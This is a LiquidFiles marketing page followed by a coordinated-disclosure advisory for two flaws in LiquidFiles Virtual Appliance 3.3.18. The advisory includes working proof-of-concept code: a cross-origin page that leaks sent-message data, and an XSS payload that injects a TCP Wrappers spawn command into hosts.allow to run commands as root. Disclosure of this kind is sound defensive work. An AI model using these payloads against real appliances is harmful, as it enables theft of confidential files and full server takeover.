## LiquidFiles Product Highlights

LiquidFiles aims to fulfil all needs most organizations need to Send, Receive
and Share Files of any file size in and out of your environment:

* Send Unlimited Sized Files to anyone using a simple Webmail-like Interface
* Receive Unlimited Sized Files from anywhere using modern and legacy methods.
* File and Folder Sharing with internal and external teams.
* Request Files with a simple link for the receiver to use when responding to the request.
* FTPdrops that can receive files and send to internal users using FTP/FTPs/SFTP or SCP.
* FTPdir - like a traditional FTP server to integrate into existing workflows using
  FTP/FTPs/SFTP or SCP.
* Emaildrops - Receive Files Securely using email with additional tracking.

## More, More & More Features...

### When we say Large Files, we mean it

LiquidFiles has no file size limit. That's right, no limit. You can send
files larger than 100GB+ if you want.

LiquidFiles uses modern HTML 5 methods for sending files, seamlessly splitting large files
in 100MB blocks when uploading. 1, 2, 10 or 10,000 of these 100MB blocks makes no difference.
This means that the only size limitations are the size of the disk you assign LiquidFiles
and the administrative limit you set for your users.

So no more 1 or 2 GB size limits that typically exists on so many cloud services and
competing products. With LiquidFiles you can definitely make overnight shipping a thing
of the past, even if you're sending many Gigabytes of data.

### Your Files in Your Control An Auditors Dream

LiquidFiles is different from most other Large File Transfer Functions in
that you will always have control over your data.

Regardless if you're sending board papers, CAD drawings of your latest
invention, sensitive client or patient data — you can rest assured that your sensitive
documents are not being shared on the same server as files from other companies or
organizations.

Your Auditors will love this (this is if Auditors in fact love
anything).

### Filedrop pages Receiving Large Files

Receiving large files is often as much of a hassle as sending large files. With LiquidFiles
you can configure Filedrop pages. A Filedrop is a page where any files uploaded is sent to a
pre-defined recipient (or recipients). There are system wide Filedrops for company wide
uses, or user Filedrops where each of your users will have their own Filedrop page and any
file uploaded there will be delivered to them.

Your users will love it, your customers will love it and the IT department
loves it as this is one less thing they will be bothered by the staff to do on an ad-hoc
basis.

### Local Deployment in your own data centre

If you want to deploy LiquidFiles in your own environment, download the VMware, Hyper-V or
ISO image and install in your own data centre and under your control. If you want maximum
performance and control of your data, this is the preferred and most secure way to deploy
LiquidFiles. Much more Secure than any Cloud Service.

### Cloud Deployment in the Amazon AWS or Microsoft Azure cloud

You can also choose to deploy LiquidFiles in your own private Amazon AWS or Microsoft Azure
cloud space. No local installation necessary and you still keep complete control over your
data.

Cloud services are great, and we believe that this is the best of both worlds —
someone else runs the servers for you. But this is still your installation, in your
control. No one else can get access to your secure files and your files don't share
location with files from other companies.

### Outlook Plugin Super Easy to use

Using the Outlook plugin, it's never been easier to send files. Click Secure Attach
instead of attach in Outlook and you are done! By default, files will also automatically
use LiquidFiles if any file attached is larger than 20MB - you can set this limit to
anything you want.

### Confirmation

No more waiting around. A confirmation email will be sent as soon as your files are
downloaded. No guessing needed and no one will be able to claim the didn't receive
the document. You have the logs and confirmation to prove it. You can even show on
a map exactly where the file was downloaded from, how fast it downloaded and what
browser and operating system was used.

### Secure by default

**Encrypted** — All files are transferred with
Strong 256 bit FIPS approved encryption.

**Authenticated** — All downloads are authenticated
(your can disable authentication if it's not needed, per message or system wide) ensuring
that only the intended recipient will receive the files. Even Unauthenticated messages
are protected using Strong Random Numbers to ensure only recipients with access to the
secure link will be able to access the message.

**Audited / Logged** — All transfers are logged,
giving you proof of any files sent in and out of the organization.

**Scanned** — All files are Virus Scanned when
uploaded and deleted if found to be infected. You can integrate with your own custom
file scanning and you can limit what types are files each user is allowed to send.

### LDAP / Active Directory Integration

With the LDAP/Active Directory Integration, you don't need to setup any users. Simply point
your LiquidFiles Virtual Appliance to your LDAP server and your users will
be able to authenticate and user accounts created automatically.

If you need, you can also set up multiple LDAP/AD servers and they will be
searched in your specified order.

### Self Managed

The LiquidFiles Virtual Appliance is architected to be as self managed as
it can be. All files have an expiration date and will be automatically deleted when the
expiration has passed. With LDAP integration you don't even have to configure any users. It's
as set and forget as it can be.

You can configure automatic Group Assignment in LiquidFiles so that your
Project Group Alpha group in Active Directory automatically gets assigned to the Project
Alpha LiquidFiles group. And users from @yourpartner.com automatically gets assigned to a
Partner Group in LiquidFiles, that has access to the Partner Info file share.

### Strong, Two Factor Authentication

For some, using two factor authentication is the holy grail of security, and
LiquidFiles support it out of the box. You can enable it for different groups of users,
like all your administrators, or for individual users.

### Scalable will grow with your needs

While the typical LiquidFiles customer is a company or organization with
between about 20 and 2000 users, there are plenty of installations in multinational
enterprises, government departments and universities with thousands and thousands of users.

For small to medium installs, or where performance is not critical, a
virtualized installation in VMware or any other virtual platform is the most common
option. For larger installs, or if performance is critical, the best option is to install
LiquidFiles on dedicated hardware.

### Single Sign-On (SSO)

LiquidFiles supports the standardized SAML2 standard for Single Sign-On,
and also a simplified pre-shared secret method for automatically log users into your
LiquidFiles system.

### Speaks Your Language — Looks Like You

All public LiquidFiles pages are fully localizable. Many users have shared their
language files and there are currently language files available for
German, French, Spanish, Dutch, Italian, Turkish, Swedish, Czech & more.

You can override all stylesheets, upload your own logos to use on the
front page, headers and footers. The text on the front page of your LiquidFiles
installation is directly editable.

### Integrates in your existing environment

LiquidFiles has an API that you can use to integrate Sending Large Files Securely
from your existing system. It could be that you have a payment system and you want
the send payslips to your employees directly from the payment system. You can then
use the API to integrate sending files using LiquidFiles directly from the payment system
and will not only send files securely but get tracking as well.

The API uses standardised protocols, http(s), REST and JSON. You can
use any programming language to send your secure files.

### Simple, No Nonsense Pricing

LiquidFiles has license brackets from **Unlimited Users**
down to a 5 user license.

You only need licenses for your own local users. You don't need any licenses for any receiving
user so you don't need to purchase license for your customers. Only your local users.

There are no lock-in contracts, hidden gotchas, reinstatement fees, payment for support or
additional features. You sign up for the number of users you need and it's valid for the
timeframe you purchased it for. When the license expires you won't be able to send any more
files but you can still download files you've already sent.

### What some of our customers say...

effective solution with the outstading personal support offerd. Install - Try - Then Buy ...

# Advisory Information

* Title: LiquidFiles Virtual Appliance Multiple Vulnerabilities
* Release mode: Coordinated disclosure
* Date published: 2020-08-05
* Class: CWE-79
* CVE IDs: CVE-2020-29071, CVE-2020-29072
* Remotely exploitable: Yes (Client-Side)
* Locally exploitable: Yes (Client-Side)

# Vulnerability Description

LiquidFiles [1](#fn1) is a Virtual Appliance that helps Companies and Organizations Send, Receive & Share Large Files, Fast & Securely.

Vulnerabilities were found in LiquidFiles V.A. which exploit the way it renders user content. Targeting a logged-in user would allow malicious users to perform client-side attacks. The impact of this ranges from executing commands as root on the server to retrieving sensitive information about encrypted e-mails, depending on the permissions of the user targeted. It should be noted that client-side interaction is mandatory for these attacks to succeed (e.g. accessing an attacker-controlled website).

# Vendor Information, Solutions and Workarounds

* The vendor issued an update to address both issues described in this advisory. Please update to LiquidFiles Virtual Appliance v3.3.19 or higher. For more information visit <https://man.liquidfiles.com/release_notes/version_3-3-x.html>.

# Vulnerable packages

* LiquidFiles Virtual Appliance v3.3.18. Previous versions were not tested.

# Credits

This vulnerability was discovered and researched by Leandro Barragan.

# Technical Description / Proof of Concept Code

## E-mail content leakage via Server-Generated Javascript Responses

[[CVE-2020-29072]](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-29072) Several endpoints were found to be using a pattern called "Server-Generated Javascript Responses". This pattern, commonly used on Rails applications, allows the application to bypass cross-origin protections by returning data in form of Javascript code, in a similar fashion to the more prevalent JSONP technique.

For example, the following URL returns all the sent e-mails: `https://server/messages/sent?format=js`

```
$("#messages").html('<thead>\n  <tr>\n    <th>ID<\/th>\n    <th><a href=\"/messages/sent?direction=asc&amp;sort=recipients\">Recipients<\/a><\/th>\n    <th><a href=\"/messages/sent?direction=asc&amp;sort=subject\">Subject<\/a><\/th>\n    <th>Filename<\/th>\n    <th><a href=\"/messages/sent?direction=asc&amp;sort=size\">Size<\/a><\/th>\n    <th><a class=\"current desc\" href=\"/messages/sent?direction=asc&amp;sort=messages.created_at\">Sent<\/a><\/th>\n    <th><a href=\"/messages/sent?direction=asc&amp;sort=messages.expires_at\">Expires<\/a><\/th>\n    <th class=\"center\"><a href=\"/messages/sent?direction=asc&amp;sort=downloads\">Downloads<\/a><\/th>\n    <th>Action<\/th>\n  <\/tr>\n<\/thead>\n<tbody>\n  <tr>\n  <td class=\"id-column\">fFAfVtDezDDAbhEjhlXGuE<\/td>\n  <td class=\"recipients_column\">xxxxx@gmail.com<\/td>\n  <td class=\"subject_column\">Test<\/td>\n  <td class=\"download_column wrap\"><\/td>\n  <td class=\"nowrap\">0 Bytes<\/td>\n\n  <td class=\"expires_column nowrap\">12 Dec, 2019 18:14<\/td>\n  <td class=\"expires_column nowrap\">11 Jan, 2020<\/td>\n  <td class=\"downloads_column center\">\n      0\n  <\/td>\n  <td class=\"actions_column nowrap\">\n    <ul class=\"nav nav-pills\">\n      <li class=\"dropdown\"><a class=\"dropdown-toggle\" data-toggle=\"dropdown\" href=\"#\"><b class=\"caret\"><\/b><\/a>\n        <ul class=\"dropdown-menu dropdown-menu-right\">\n          <li><a data-toggle=\"modal\" data-target=\"#message_modal\" data-cache=\"false\" href=\"/message/fFAfVtDezDDAbhEjhlXGuE/popup\">View Message (Popup)<\/a><\/li>\n          <li><a href=\"/message/fFAfVtDezDDAbhEjhlXGuE\">View Message<\/a><\/li> [...SNIPPED...]

```

An attacker could embed that endpoint in its own website in order to access the information about the encrypted messages a user sent in the past:

```
<html>
<head><script src="https://code.jquery.com/jquery-3.4.1.js"></script></head>
  <body>
    <div id="messages" class="messages"></div>
    <script src="https://server/messages/sent?format=js"></script>
  </body>
</html>

```

After obtaining the IDs of the sent messages, its contents can also be disclosed by including the following URL: `https://server/message/<ID>/popup?format=js`

This issue is not limited to the previously mentioned endpoints, approximately 109 ERB views were found to be vulnerable to this issue.

## Cross-Site Scripting via Rendering of Uploaded Files

[[CVE-2020-29071]](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-29071) A Cross-Site Scripting issue was found which can be exploited by uploading HTML files using the "Shares" feature.

When viewing uploaded files using the UI, documents are embedded using iframes with the "sandbox" attribute set. This prevents any malicious Javascript code from being executed. However, accessing the file directly using the generated URL would render the file inline in the context of the web application's origin:

* `https://server/shares/<SHARE_NAME>/folders/root/files/<FILENAME>-htmlview/<FILENAME>`

Leveraging this behavior, it is possible to obtain code execution as root on the appliance by targeting users with "Sysadmin" privileges. LiquidFiles offers a way to set a password in order to log into the appliance via SSH. This password can only be set on the first login, and then it can not be changed using the web interface. Given that this is not always the case, this option is nonideal.

Another method exists to achieve code execution. The "Access Control" setting on the UI embeds the user input verbatim on `/etc/hosts.allow`. By leveraging TCP Wrappers ability to execute commands, an attacker can send a specially crafted "Allowed Hosts" list which would execute arbitrary commands as root after any other user tries to connect to the SSH Daemon running on the server. A proof of concept document for this is provided below:

```
<html>
<body>
  <script type="application/javascript">
    command = '/usr/bin/touch /tmp/sarasa'
    system_console_url = '/system/console';

    function get_csrf_token(html_content) {
      var doc = document.implementation.createHTMLDocument();
      doc.body.innerHTML = html_content;
      csrf_token = doc.getElementsByName('csrf-token')[0].getAttribute('content');
    }

    function send_commands_to_execute() {
      var payload = "ALL: spawn (" + command + ") &";
      fetch(system_console_url + "/access", {
         credentials: 'include',
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded'},
         body: 'utf8=%E2%9C%93&authenticity_token=' + encodeURIComponent(csrf_token) +
          '&commit=Save' + '&hosts_allow=' + encodeURIComponent(payload)
      }).then((response)=>{ console.log("attack successful")})
    }

    fetch(system_console_url).then((resp)=>{ return resp.text() })
      .then((text)=>{ get_csrf_token(text) })
      .then((text)=>{ send_commands_to_execute() });
  </script>
</body>
</html>

```
